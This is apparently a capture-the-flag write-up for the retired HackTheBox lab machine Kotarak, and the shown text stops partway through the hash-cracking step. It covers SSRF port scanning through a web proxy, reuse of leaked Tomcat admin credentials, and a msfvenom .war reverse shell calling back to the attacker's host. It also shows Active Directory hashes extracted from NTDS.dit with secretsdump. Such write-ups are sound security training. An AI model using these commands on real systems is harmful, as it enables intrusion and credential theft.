@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Kotarak</strong></h1>
+        <em>Released: 23 Sep 2017 / Pwned: October 24th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        On Kotarak, you use the web proxy provided to bruteforce for internally running services. Following the open ports, you find a backup file containing Apache Tomcat credentials. Get a shell on the system by uploading a .war file to Apache Tomcat, and priv-esc to the next user by extracting and cracking a password hash from a SYSTEM hive. Priv-esc to root involves exploiting wget.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.55</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 22,8009,8080,60000 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.55</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.55<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                8009<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;ajp13<br>
+                8080<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http-proxy<br>
+                60000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;unknown<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;nmap&nbsp;-p&nbsp;22,8009,8080,60000&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.55<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;e2<span style="color:#ff9d00;font-weight:700">:</span>d7<span style="color:#ff9d00;font-weight:700">:</span>ca<span style="color:#ff9d00;font-weight:700">:</span>0e<span style="color:#ff9d00;font-weight:700">:</span>b7<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>0a<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>f7<span style="color:#ff9d00;font-weight:700">:</span>2e<span style="color:#ff9d00;font-weight:700">:</span>75<span style="color:#ff9d00;font-weight:700">:</span>ea<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>24<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>74&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;e8<span style="color:#ff9d00;font-weight:700">:</span>f1<span style="color:#ff9d00;font-weight:700">:</span>c0<span style="color:#ff9d00;font-weight:700">:</span>d3<span style="color:#ff9d00;font-weight:700">:</span>7d<span style="color:#ff9d00;font-weight:700">:</span>9b<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>73<span style="color:#ff9d00;font-weight:700">:</span>ad<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>3b<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>e1<span style="color:#ff9d00;font-weight:700">:</span>64<span style="color:#ff9d00;font-weight:700">:</span>8e<span style="color:#ff9d00;font-weight:700">:</span>e9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;6d<span style="color:#ff9d00;font-weight:700">:</span>e9<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>ad<span style="color:#ff9d00;font-weight:700">:</span>86<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>2d<span style="color:#ff9d00;font-weight:700">:</span>68<span style="color:#ff9d00;font-weight:700">:</span>e1<span style="color:#ff9d00;font-weight:700">:</span>eb<span style="color:#ff9d00;font-weight:700">:</span>ad<span style="color:#ff9d00;font-weight:700">:</span>66<span style="color:#ff9d00;font-weight:700">:</span>a0<span style="color:#ff9d00;font-weight:700">:</span>60<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>b8&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                8009<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;ajp13&nbsp;&nbsp;&nbsp;Apache&nbsp;Jserv&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Protocol&nbsp;v1.3<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ajp-methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;Supported&nbsp;methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;GET&nbsp;HEAD&nbsp;POST&nbsp;PUT&nbsp;DELETE&nbsp;OPTIONS<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PUT&nbsp;DELETE<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;See&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org<span style="color:#ff9d00;font-weight:700">/</span>nsedoc<span style="color:#ff9d00;font-weight:700">/</span>scripts<span style="color:#ff9d00;font-weight:700">/</span>ajp-methods.html<br>
+                8080<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;Tomcat&nbsp;8.5.5<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-favicon<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache&nbsp;Tomcat<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PUT&nbsp;DELETE<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache&nbsp;Tomcat<span style="color:#ff9d00;font-weight:700">/</span>8.5.5&nbsp;-&nbsp;Error&nbsp;report<br>
+                60000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kotarak&nbsp;Web&nbsp;Hosting<br>
+                <br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • 22/ssh - Nothing to do here, but useful to know for later.<br>
+        • 8009/tcp - Apache Jserv, which is serving Apache Tomcat on port 8080.<br>
+        • 8080/tcp - Apache Tomcat, which is a “pure Java� HTTP web server where you can run java code. Credentials are required to access its manager portal.<br>
+        • 60000/tcp - “Kotarak Web Hosting� - looks interesting.<br>
+        <br>
+        I added <code>kotorak.htb</code> to my hosts file.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>hosts<br>
+                [...]<br>
+                10.10.10.55&nbsp;kotarak.htb
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 60000/tcp - Kotarak Web Hosting</strong></h2><br>
+        Visit <code>http://kotarak.htb:60000</code><br>
+        This Kotarak site appears to be a web proxy.<br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We can use this site to browse other sites, like <code>google.com</code>, or your own malicious server, or the other services running at localhost on the box, like Apache Tomcat on port 8080 - <code>http://localhost:8080</code><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) Bruteforce Internal Services</strong></h3><br>
+        Because this proxy allows us to browse localhost, we can use it to bruteforce for/browse to internally-running services running on different ports on the target system.<br>
+        <br>
+        You could do this with Burp Intruder, but I dont have premium so it would be incredibly slow.<br>
+        Instead, I wrote a small python script.<br>
+        <br>
+        The script:<br>
+        • sends a GET request to all ports from 1 to 65,535<br>
+        • retrieves the output<br>
+        • and marks all ports which returned more than 2 bytes as open (closed ports returned \n\n)<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;port&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">65535</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://kotarak.htb:60000/url.php?path=http://localhost:"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(port)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;requests.get(url)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(response.content)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">2</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(port)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">"\nFinished!"</span>)
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;python3&nbsp;internal-ports.py<br>
+                22<br>
+                90<br>
+                110<br>
+                200<br>
+                320<br>
+                888<br>
+                3306<br>
+                8080
+            </div>
+        </div><br>
+        <br>
+        It looks like there are a few internally running services!<br>
+        <code>90</code>, <code>110</code>, <code>200</code>, <code>320</code>, <code>888</code> and <code>3306</code>.<br>
+        <br>
+        A quick browse of each of them reveals:<br>
+        • 90 - “Under Construction�<br>
+        • 110 - “Test Page. Absolutely nothing to see here�<br>
+        • 200 - “Hello World�<br>
+        • 320 - “Accounting - Super Sensitive Login Page�<br>
+        • 888 - “Simple File Viewer�<br>
+        • 3306 - Most likely MySQL<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Simple File Viewer</strong></h2><br>
+        Use the Kotarak web proxy to view the Simple File Viewer running on localhost port 888.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Files!<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Following the link to the ‘backup’ file, the URL is now incorrect. We're browsing the Kotarak proxy URL (not <code>localhost:888/&lt;backup file&gt;</code>)<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Find the location where backup points to by viewing the source of <code>http://kotarak.htb:60000/url.php?path=http://localhost:888</code>.<br>
+        <br>
+        To view the ‘backup’ file, the URL parameters are <code>?doc=backup</code><br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <code>backup</code> is located at <code>http://kotarak.htb:60000/url.php?path=http://localhost:888?doc=backup</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        Nothing?<br>
+        Right click &gt; view source.<br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <code>backup</code> is a backup of the <code>tomcat_users.xml</code> file, which contains a set of admin credentials.<br>
+        You can log in to Apache Tomcat with these.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) Apache Tomcat .war shell</strong></h2><br>
+        With Apache Tomcat credentials, we can log in to Apache Tomcat and upload a .war reverse shell.<br>
+        <br>
+        Browse to <code>http://kotarak.htb:8080/manager/html</code> and log in with <code>admin / 3@g01PdhB!</code><br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        You should be at the <code>/manager</code> portal.<br>
+        From here we can upload a <code>.war</code> reverse shell.<br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        Generate a <code>.war</code> reverse shell with msfvenom.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/kotarak#&nbsp;msfvenom&nbsp;-p&nbsp;java/jsp_shell_reverse_tcp&nbsp;LHOST=10.10.14.11&nbsp;LPORT=9001&nbsp;-f&nbsp;war&nbsp;-o&nbsp;lulz.war<br>
+                Payload&nbsp;size:&nbsp;1097&nbsp;bytes<br>
+                Final&nbsp;size&nbsp;of&nbsp;war&nbsp;file:&nbsp;1097&nbsp;bytes<br>
+                Saved&nbsp;as:&nbsp;lulz.war
+            </div>
+        </div><br>
+        <br>
+        Navigate to <em>Select WAR file to upload</em> &gt; <em>Browse</em> and upload your <code>.war</code> reverse shell.<br>
+        <br>
+        Start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run your uploaded <code>.war</code> by visiting to link to you reverse shell under <em>Applications</em>.<br>
+        You should receive a shell on your listener!<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h1><strong>Priv-Esc to atanas</strong></h1>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>5) pentest_data</strong></h2><br>
+        In <code>tomcat</code>'s <code>/home</code> folder, we find <code>pentest_data</code>.<br>
+        <br>
+        Transfer the <code>pentest_data</code> over to your attacking system by starting a python server on Kotarak and wget'ing the files to your attacking machine.<br>
+            <div class="codebox">
+                tomcat@kotarak-dmz<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>tomcat<span style="color:#ff9d00;font-weight:700">/</span>to_archive<span style="color:#ff9d00;font-weight:700">/</span>pentest_data$&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                [...]<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.55<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.55<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+            </div>
+        </div><br>
+        <br>
+        A quick google of <code>psexec.ntdsgrab</code> reveals that these files are generated by a metasploit module - psexec_ntdsgrab.rb - which retreives the <code>NTDS.dit</code> database and the <code>SYSTEM</code> registry hive.<br>
+        <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb</a><br>
+        <br>
+        During pentests where the attacker has gained access to the Windows Domain Controller, it's a common move to extract the password hashes of all the domain users from Active Directory for offline cracking.<br>
+        <br>
+        For this, the attacker needs to retrieve 2 files:<br>
+        • <code>NTDS.DIT</code> - This is the main Active Directory database file. It stores everything held in Active Directory - group policies, users, password hashes etc.<br>
+        • <code>SYSTEM registry hive</code> - SYSTEM is part of the Windows registry. It contains the key needed to decrypt NTDS.DIT<br>
+        <br>
+        Examine the files.<br>
+        The <code>.dit</code> is NTDS.dit.<br>
+        The <code>.bin</code> is the SYSTEM registry hive.<br>
+        I renamed the files accordingly.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;*<br>
+                20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Extensible&nbsp;storage&nbsp;engine&nbsp;DataBase,&nbsp;version&nbsp;0x620,&nbsp;checksum&nbsp;0x16d44752,&nbsp;page&nbsp;size&nbsp;8192,&nbsp;DirtyShutdown,&nbsp;Windows&nbsp;version&nbsp;6.1<br>
+                20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;MS&nbsp;Windows&nbsp;registry&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>,&nbsp;NT<span style="color:#ff9d00;font-weight:700">/</span>2000&nbsp;or&nbsp;above<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit&nbsp;ntds.dit<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin&nbsp;systemhive<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                ntds.dit&nbsp;&nbsp;systemhive
+            </div>
+        </div><br>
+        <br>
+        We can extract the Active Directory password hashes from NTDS.dit using Impacket's <code>secretsdump.py</code><br>
+        <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py</a><br>
+        <br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;secretsdump.py&nbsp;LOCAL&nbsp;-ntds&nbsp;ntds.dit&nbsp;-system&nbsp;systemhive<br>
+                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                [*]&nbsp;Target&nbsp;system&nbsp;bootKey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x14b6fb98fedc8e15107867c4722d1399<br>
+                [*]&nbsp;Dumping&nbsp;Domain&nbsp;Credentials&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>domain<span style="color:#333333;font-weight:400">\u</span>id<span style="color:#ff9d00;font-weight:700">:</span>rid<span style="color:#ff9d00;font-weight:700">:</span>lmhash<span style="color:#ff9d00;font-weight:700">:</span>nthash<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [*]&nbsp;Searching&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">pekList</span>,&nbsp;be&nbsp;patient<br>
+                [*]&nbsp;PEK&nbsp;#&nbsp;0&nbsp;found&nbsp;and&nbsp;decrypted:&nbsp;d77ec2af971436bccb3b6fc4a969d7ff<br>
+                [*]&nbsp;Reading&nbsp;and&nbsp;decrypting&nbsp;hashes&nbsp;from&nbsp;ntds.dit&nbsp;<br>
+                Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::<br>
+                Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+                WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::<br>
+                krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::<br>
+                WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::<br>
+                WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::<br>
+                WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::<br>
+                WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::<br>
+                atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::<br>
+                [*]&nbsp;Kerberos&nbsp;keys&nbsp;from&nbsp;ntds.dit&nbsp;<br>
+                Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2<br>
+                Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        We don't care about any of the Kerboros keys (because we're not attacking a domain controller?).<br>
+        <br>
+        Put the hashes you're interested in cracking into a file, and trim the hash from each line using <code>awk</code>.<br>
+        Each item is separated by a <code>:</code>. The password hash is the 4th item on the line<br>
+        <br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kotarak<span style="color:#ff9d00;font-weight:700">/</span>pentest_data#&nbsp;nano&nbsp;secretsdump.txt<br>
+                Administrator<span style="color:#ff9d00;font-weight:700">:</span>500<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>e64fe0f24ba2489c05e64354d74ebd11<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                Guest<span style="color:#ff9d00;font-weight:700">:</span>501<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>31d6cfe0d16ae931b73c59d7e0c089c0<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                WIN-3G2B0H151AC$<span style="color:#ff9d00;font-weight:700">:</span>1000<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>668d49ebfdb70aeee8bcaeac9e3e66fd<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                krbtgt<span style="color:#ff9d00;font-weight:700">:</span>502<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>ca1ccefcb525db49828fbb9d68298eee<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                WIN2K8$<span style="color:#ff9d00;font-weight:700">:</span>1103<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>160f6c1db2ce0994c19c46a349611487<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                WINXP1$<span style="color:#ff9d00;font-weight:700">:</span>1104<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>6f5e87fd20d1d8753896f6c9cb316279<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                WIN2K31$<span style="color:#ff9d00;font-weight:700">:</span>1105<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>cdd7a7f43d06b3a91705900a592f3772<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                WIN7$<span style="color:#ff9d00;font-weight:700">:</span>1106<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>24473180acbcc5f7d2731abe05cfa88c<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                atanas<span style="color:#ff9d00;font-weight:700">:</span>1108<span style="color:#ff9d00;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#ff9d00;font-weight:700">:</span>2b576acbe6bcfda7294d6bd18041b8fe<span style="color:#ff9d00;font-weight:700">:::</span><br>
